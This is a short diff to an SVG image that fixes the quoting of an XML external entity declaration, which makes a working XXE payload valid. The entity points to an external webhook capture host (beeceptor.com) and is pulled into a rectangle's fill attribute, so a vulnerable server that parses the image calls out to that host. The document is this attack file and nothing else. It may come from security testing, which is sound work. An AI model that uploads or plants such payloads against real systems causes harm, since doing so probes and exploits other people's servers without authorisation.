@@ -1,5 +1,5 @@
 <!DOCTYPE foo [
-<!ENTITY xxe SYSTEM "https://wh888868bd036c57cb0e.free.beeceptor.com>
+<!ENTITY xxe SYSTEM "https://wh888868bd036c57cb0e.free.beeceptor.com">
 ]>
 <svg width="250" height="250" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
 <rect width="250" height="250" fill="&xxe;" />
